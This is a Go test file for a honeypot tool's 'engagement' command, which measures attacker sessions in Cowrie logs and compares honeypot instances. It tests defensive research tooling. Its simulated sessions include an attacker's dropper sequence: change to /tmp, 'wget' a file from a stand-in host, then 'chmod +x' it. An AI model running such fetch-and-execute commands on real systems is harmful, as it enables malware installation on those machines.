package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/spf13/cobra"

	"github.com/qpot/qpot/internal/config"
	"github.com/qpot/qpot/internal/database"
	"github.com/qpot/qpot/internal/engagement"
)

// engagementLog is one Cowrie session that logs in, runs a probe and leaves,
// then a line that is not an event.
const engagementLog = `{"eventid":"cowrie.session.connect","src_ip":"203.0.113.5","session":"aa11","timestamp":"2026-03-01T10:00:00.000000Z"}
{"eventid":"cowrie.login.success","username":"root","password":"admin","src_ip":"203.0.113.5","session":"aa11","timestamp":"2026-03-01T10:00:01.000000Z"}
{"eventid":"cowrie.command.input","input":"uname -a","src_ip":"203.0.113.5","session":"aa11","timestamp":"2026-03-01T10:00:02.000000Z"}
{"eventid":"cowrie.session.closed","duration":4.5,"src_ip":"203.0.113.5","session":"aa11","timestamp":"2026-03-01T10:00:04.500000Z"}
not an event
`

// runEngagement runs `qpot engagement` in an empty home directory.
func runEngagement(t *testing.T, args ...string) (string, error) {
	t.Helper()
	t.Setenv("HOME", t.TempDir())
	t.Setenv("USERPROFILE", os.Getenv("HOME"))
	return executeEngagement(t, args...)
}

// executeEngagement runs `qpot engagement` under a root command that checks
// the instance flag the way the real one does.
func executeEngagement(t *testing.T, args ...string) (string, error) {
	t.Helper()
	root := &cobra.Command{Use: "qpot", SilenceUsage: true, SilenceErrors: true, PersistentPreRunE: checkInstanceFlag}
	root.AddCommand(newEngagementCommand())
	var out bytes.Buffer
	root.SetOut(&out)
	root.SetErr(&out)
	root.SetArgs(append([]string{"engagement"}, args...))
	err := root.Execute()
	return out.String(), err
}

func TestEngagementCommandOnCowrieLog(t *testing.T) {
	path := filepath.Join(t.TempDir(), "cowrie.json")
	if err := os.WriteFile(path, []byte(engagementLog), 0o600); err != nil {
		t.Fatal(err)
	}

	// No instance exists and none is named: the log alone is enough.
	text, err := runEngagement(t, "--cowrie-log", path)
	if err != nil {
		t.Fatalf("engagement on a log failed: %v\n%s", err, text)
	}
	for _, want := range []string{"METRIC", "COWRIE.JSON", "Logged in", "100.0%", "Left after a probe", "4.5s", "Log lines: 5 read, 1 malformed", "Top command stems: uname (1)"} {
		if !strings.Contains(text, want) {
			t.Errorf("%q is missing from:\n%s", want, text)
		}
	}
	if strings.Contains(text, "qp_") {
		t.Errorf("the output names a QPot ID:\n%s", text)
	}

	// Two logs, one labelled: JSON with both reports and their comparison.
	raw, err := runEngagement(t, "--cowrie-log", path, "--label", "stock", "--cowrie-log", path, "--json")
	if err != nil {
		t.Fatalf("engagement --json failed: %v\n%s", err, raw)
	}
	var got engagementOutput
	if err := json.Unmarshal([]byte(raw), &got); err != nil {
		t.Fatalf("not JSON: %v\n%s", err, raw)
	}
	if len(got.Reports) != 2 || len(got.Comparisons) != 1 {
		t.Fatalf("reports = %d, comparisons = %d, want 2 and 1", len(got.Reports), len(got.Comparisons))
	}
	first, second := got.Reports[0], got.Reports[1]
	if first.Label != "stock" || second.Label != "cowrie.json" || first.Source != "cowrie-log" {
		t.Errorf("labels = %q, %q, source = %q", first.Label, second.Label, first.Source)
	}
	m := first.Overall
	if m.Sessions != 1 || m.Funnel.LoggedIn.Count != 1 || m.Depth.Max != 1 || m.LeftAfterProbe.Count != 1 || m.Duration.All.MaxSeconds != 4.5 {
		t.Errorf("metrics = %+v", m)
	}
	if first.Input.Log == nil || first.Input.Log.Lines != 5 || first.Input.Log.Malformed != 1 || first.Input.Log.Events != 4 {
		t.Errorf("log stats = %+v", first.Input.Log)
	}
	if c := got.Comparisons[0]; c.A != "stock" || c.B != "cowrie.json" || len(c.Deltas) == 0 {
		t.Errorf("comparison = %+v", c)
	}

	// --since limits a log to the window; the fixture is older than a day.
	raw, err = runEngagement(t, "--cowrie-log", path, "--since", "1d", "--json")
	if err != nil {
		t.Fatal(err)
	}
	got = engagementOutput{}
	if err := json.Unmarshal([]byte(raw), &got); err != nil {
		t.Fatal(err)
	}
	if time.Since(time.Date(2026, 3, 2, 10, 0, 0, 0, time.UTC)) > 0 {
		if r := got.Reports[0]; r.Overall.Sessions != 0 || r.Input.Log.OutsideWindow != 4 {
			t.Errorf("with --since 1d: sessions = %d, outside the window = %d", r.Overall.Sessions, r.Input.Log.OutsideWindow)
		}
	}
}

func TestEngagementCommandErrors(t *testing.T) {
	path := filepath.Join(t.TempDir(), "cowrie.json")
	if err := os.WriteFile(path, []byte(engagementLog), 0o600); err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		name string
		args []string
		want string
	}{
		{"nothing to measure", nil, "name an instance"},
		{"missing log", []string{"--cowrie-log", filepath.Join(t.TempDir(), "none.json")}, "cannot read the Cowrie log"},
		{"more labels than logs", []string{"--cowrie-log", path, "--label", "a", "--label", "b"}, "more labels than logs"},
		{"bad window", []string{"--cowrie-log", path, "--since", "soon"}, "invalid --since"},
		{"zero window", []string{"--cowrie-log", path, "--since", "0d"}, "invalid --since"},
		{"bad honeypot", []string{"--cowrie-log", path, "--honeypot", "a b"}, "invalid honeypot name"},
		{"instance that does not exist", []string{"-i", "nosuchinstance"}, "does not exist"},
		{"invalid instance name", []string{"-i", "../x"}, "invalid instance name"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			out, err := runEngagement(t, tc.args...)
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Errorf("error = %v, want one containing %q\n%s", err, tc.want, out)
			}
		})
	}
}

func TestEngagementParseSince(t *testing.T) {
	good := map[string]time.Duration{"7d": 7 * 24 * time.Hour, "2w": 14 * 24 * time.Hour, "36h": 36 * time.Hour, " 1d ": 24 * time.Hour, "90m": 90 * time.Minute}
	for in, want := range good {
		if got, err := parseSince(in); err != nil || got != want {
			t.Errorf("parseSince(%q) = %v, %v, want %v", in, got, err, want)
		}
	}
	for _, in := range []string{"", "d", "-1d", "0w", "1.5d", "99999d", "-3h", "0s", "week"} {
		if got, err := parseSince(in); err == nil {
			t.Errorf("parseSince(%q) = %v, want an error", in, got)
		}
	}
}

// storedEvents answers GetEvents like a database backend: the events of the
// window and of the named honeypots, newest first, cut by offset and limit.
type storedEvents struct {
	events []*database.Event
	// filters records the honeypot filter of every read.
	filters [][]string
}

func (s *storedEvents) GetEvents(_ context.Context, q database.EventFilter) ([]*database.Event, error) {
	s.filters = append(s.filters, q.Honeypots)
	if q.Limit <= 0 {
		return nil, errors.New("unbounded read")
	}
	var out []*database.Event
	for _, e := range s.events {
		wanted := len(q.Honeypots) == 0
		for _, hp := range q.Honeypots {
			wanted = wanted || hp == e.Honeypot
		}
		if !wanted || e.Timestamp.After(q.EndTime) || (!q.StartTime.IsZero() && e.Timestamp.Before(q.StartTime)) {
			continue
		}
		out = append(out, e)
	}
	sort.SliceStable(out, func(i, j int) bool { return out[i].Timestamp.After(out[j].Timestamp) })
	if q.Offset >= len(out) {
		return nil, nil
	}
	out = out[q.Offset:]
	if len(out) > q.Limit {
		out = out[:q.Limit]
	}
	return out, nil
}

// storedSessions builds n Cowrie sessions the way the collector stores them,
// one a minute over the last hours, each from its own address. With engaged
// set every visitor logs in and runs three commands; otherwise it connects
// and leaves. Each store also holds events of another honeypot.
func storedSessions(name string, n int, engaged bool) *storedEvents {
	start := time.Now().UTC().Add(-3 * time.Hour)
	s := &storedEvents{}
	for i := 0; i < n; i++ {
		at := start.Add(time.Duration(i) * time.Minute)
		md := map[string]string{"session": fmt.Sprintf("%s-%d", name, i)}
		ev := func(offset time.Duration, typ string) *database.Event {
			e := &database.Event{
				Timestamp: at.Add(offset), Honeypot: "cowrie", SourceIP: fmt.Sprintf("203.0.113.%d", i+1),
				EventType: typ, Metadata: md,
			}
			s.events = append(s.events, e)
			return e
		}
		ev(0, "cowrie.session.connect")
		length := "2.5"
		if engaged {
			login := ev(time.Second, "cowrie.login.success")
			login.Username, login.Password = "root", "admin"
			for j, line := range []string{"cd /tmp", "wget http://198.51.100.9/x", "chmod +x x"} {
				ev(time.Duration(2+j)*time.Second, "cowrie.command.input").Command = line
			}
			length = "40"
		}
		closed := ev(10*time.Second, "cowrie.session.closed")
		closed.Metadata = map[string]string{"session": md["session"], "duration": length}
		s.events = append(s.events, &database.Event{
			Timestamp: at, Honeypot: "dionaea", SourceIP: "198.51.100.200", EventType: "dionaea.connection",
		})
	}
	return s
}

// engagementInstances makes the named instances exist in an empty home
// directory and serves their stored events from memory. It returns the
// instance names in the order they were opened and closed.
func engagementInstances(t *testing.T, stores map[string]*storedEvents) (opened, closed *[]string) {
	t.Helper()
	t.Setenv("HOME", t.TempDir())
	t.Setenv("USERPROFILE", os.Getenv("HOME"))
	for name := range stores {
		path := config.Default(name).ConfigPath
		if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte("instance_name: "+name+"\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	opened, closed = new([]string), new([]string)
	real := openInstanceEvents
	t.Cleanup(func() { openInstanceEvents = real })
	openInstanceEvents = func(_ context.Context, name string) (engagement.EventReader, func(), error) {
		store, ok := stores[name]
		if !ok {
			return nil, nil, fmt.Errorf("no stored events for instance %q", name)
		}
		*opened = append(*opened, name)
		return store, func() { *closed = append(*closed, name) }, nil
	}
	return opened, closed
}

func TestEngagementCommandAgainst(t *testing.T) {
	stores := map[string]*storedEvents{
		"treat":   storedSessions("treat", 40, true),
		"control": storedSessions("control", 40, false),
		"third":   storedSessions("third", 5, false),
	}
	opened, closed := engagementInstances(t, stores)

	raw, err := executeEngagement(t, "-i", "treat", "--against", "control", "--honeypot", "cowrie", "--json")
	if err != nil {
		t.Fatalf("engagement --against failed: %v\n%s", err, raw)
	}
	var got engagementOutput
	if err := json.Unmarshal([]byte(raw), &got); err != nil {
		t.Fatalf("not JSON: %v\n%s", err, raw)
	}
	if want := []string{"treat", "control"}; !reflect.DeepEqual(*opened, want) || !reflect.DeepEqual(*closed, want) {
		t.Errorf("instances opened %v and closed %v, want %v", *opened, *closed, want)
	}
	if len(got.Reports) != 2 || len(got.Comparisons) != 1 {
		t.Fatalf("reports = %d, comparisons = %d, want 2 and 1", len(got.Reports), len(got.Comparisons))
	}
	for i, label := range []string{"treat", "control"} {
		r := got.Reports[i]
		if r.Label != label || r.Source != "qpot-instance" || !reflect.DeepEqual(r.HoneypotFilter, []string{"cowrie"}) {
			t.Errorf("report %d: label %q, source %q, filter %v", i, r.Label, r.Source, r.HoneypotFilter)
		}
		// The other honeypot's events were left out by the filter.
		if r.Overall.Sessions != 40 || len(r.Honeypots) != 1 || r.Honeypots[0].Honeypot != "cowrie" || r.Sources.Public != 40 {
			t.Errorf("report %d: %d sessions over %+v, %d public sources", i, r.Overall.Sessions, r.Honeypots, r.Sources.Public)
		}
		for _, filter := range stores[label].filters {
			if !reflect.DeepEqual(filter, []string{"cowrie"}) {
				t.Errorf("instance %s was read with the honeypot filter %v", label, filter)
			}
		}
	}
	if m := got.Reports[0].Overall; m.Funnel.LoggedIn.Count != 40 || m.Depth.Median != 3 || m.Duration.All.MedianSeconds != 40 {
		t.Errorf("treat = %+v", m)
	}

	c := got.Comparisons[0]
	if c.A != "treat" || c.B != "control" || c.TestedRows == 0 {
		t.Fatalf("comparison = %+v", c)
	}
	e := c.Exposure
	if !e.Comparable || e.A.Sessions != 40 || e.B.Sessions != 40 || e.SessionRatio != 1 || e.SharedSources != 40 || e.Jaccard != 1 || e.OverlapPercent < 99 {
		t.Errorf("exposure = %+v", e)
	}
	verdicts := map[string]string{}
	for _, d := range c.Deltas {
		verdicts[d.Key] = d.Verdict
	}
	for key, want := range map[string]string{
		"logged_in_pct":         engagement.VerdictClear,
		"interactive_pct":       engagement.VerdictClear,
		"duration_all_median_s": engagement.VerdictClear,
		"payload_pct":           engagement.VerdictNone,
		"depth_median":          engagement.VerdictTooFew, // control has no interactive session
		"sessions":              "",
	} {
		if verdicts[key] != want {
			t.Errorf("verdict of %s = %q, want %q", key, verdicts[key], want)
		}
	}
	if p := c.Paired; p.Skipped || p.Shared != 40 || len(p.Measures) != 5 || p.Measures[0].Key != "logged_in" ||
		p.Measures[0].AFurther != 40 || p.Measures[0].BFurther != 0 || p.Measures[0].Verdict != engagement.VerdictClear {
		t.Errorf("shared sources = %+v", p)
	}
	if strings.Contains(raw, "203.0.113.") || strings.Contains(raw, "qp_") {
		t.Errorf("the output names a source address or a QPot ID:\n%s", raw)
	}

	// The same as text.
	text, err := executeEngagement(t, "-i", "treat", "--against", "control", "--honeypot", "cowrie")
	if err != nil {
		t.Fatalf("engagement --against failed: %v\n%s", err, text)
	}
	for _, want := range []string{
		"Exposure check: A = treat, B = control", "Passed: session ratio at most 3",
		"TREAT", "CONTROL", "DIFFERENCE", "95% INTERVAL",
		"Differences, B minus A: A = treat, B = control", "clear difference", "too few to compare",
		"Shared sources: A = treat, B = control", "40 public source addresses were seen by both.",
	} {
		if !strings.Contains(text, want) {
			t.Errorf("%q is missing from:\n%s", want, text)
		}
	}
	if strings.Index(text, "Exposure check") > strings.Index(text, "METRIC") {
		t.Errorf("the exposure check must come before the table:\n%s", text)
	}

	// Two instances and a log: the instance named by -i comes first, then the
	// --against instances in order, then the logs.
	path := filepath.Join(t.TempDir(), "cowrie.json")
	if err := os.WriteFile(path, []byte(engagementLog), 0o600); err != nil {
		t.Fatal(err)
	}
	*opened = nil
	raw, err = executeEngagement(t, "-i", "treat", "--against", "third", "--against", "control", "--cowrie-log", path, "--label", "stock", "--json")
	if err != nil {
		t.Fatalf("engagement with two --against failed: %v\n%s", err, raw)
	}
	got = engagementOutput{}
	if err := json.Unmarshal([]byte(raw), &got); err != nil {
		t.Fatalf("not JSON: %v\n%s", err, raw)
	}
	var labels, compared []string
	for _, r := range got.Reports {
		labels = append(labels, r.Label+":"+r.Source)
	}
	for _, c := range got.Comparisons {
		compared = append(compared, c.A+">"+c.B)
	}
	if want := []string{"treat:qpot-instance", "third:qpot-instance", "control:qpot-instance", "stock:cowrie-log"}; !reflect.DeepEqual(labels, want) {
		t.Errorf("reports = %v, want %v", labels, want)
	}
	if want := []string{"treat>third", "treat>control", "treat>stock"}; !reflect.DeepEqual(compared, want) {
		t.Errorf("comparisons = %v, want %v", compared, want)
	}
	if want := []string{"treat", "third", "control"}; !reflect.DeepEqual(*opened, want) {
		t.Errorf("instances opened %v, want %v", *opened, want)
	}
	// Without --honeypot every honeypot of every instance is read.
	if r := got.Reports[2]; len(r.Honeypots) != 2 || r.HoneypotFilter != nil {
		t.Errorf("control without a filter: %+v, filter %v", r.Honeypots, r.HoneypotFilter)
	}
	// 5 sessions against 40: the exposure check says so.
	if e := got.Comparisons[0].Exposure; e.Comparable || len(e.Problems) == 0 || !strings.Contains(e.Problems[0], "times the sessions of third") {
		t.Errorf("exposure against the small instance = %+v", e)
	}
}

func TestEngagementCommandAgainstErrors(t *testing.T) {
	opened, _ := engagementInstances(t, map[string]*storedEvents{
		"treat":   storedSessions("treat", 3, true),
		"control": storedSessions("control", 3, false),
	})
	path := filepath.Join(t.TempDir(), "cowrie.json")
	if err := os.WriteFile(path, []byte(engagementLog), 0o600); err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		name string
		args []string
		want string
	}{
		{"no instance to compare with", []string{"--against", "control"}, "--against compares with the instance named by -i"},
		{"a log is not an instance", []string{"--cowrie-log", path, "--against", "control"}, "--against compares with the instance named by -i"},
		{"instance that does not exist", []string{"-i", "treat", "--against", "nosuchinstance"}, `instance "nosuchinstance" does not exist`},
		{"invalid instance name", []string{"-i", "treat", "--against", "../control"}, "invalid instance name"},
		{"the same instance", []string{"-i", "treat", "--against", "treat"}, "already being measured"},
		{"named twice", []string{"-i", "treat", "--against", "control", "--against", "control"}, "already being measured"},
		{"the first instance does not exist", []string{"-i", "nosuchinstance", "--against", "control"}, `instance "nosuchinstance" does not exist`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			out, err := executeEngagement(t, tc.args...)
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Errorf("error = %v, want one containing %q\n%s", err, tc.want, out)
			}
		})
	}
	if len(*opened) != 0 {
		t.Errorf("a refused command opened %v", *opened)
	}

	// A database that cannot be opened stops the run with its error.
	real := openInstanceEvents
	defer func() { openInstanceEvents = real }()
	openInstanceEvents = func(_ context.Context, name string) (engagement.EventReader, func(), error) {
		if name == "control" {
			return nil, nil, errors.New("failed to connect to the database of instance \"control\" (is it running?)")
		}
		return real(context.Background(), name)
	}
	if out, err := executeEngagement(t, "-i", "treat", "--against", "control"); err == nil || !strings.Contains(err.Error(), `instance "control" (is it running?)`) {
		t.Errorf("error = %v\n%s", err, out)
	}
}
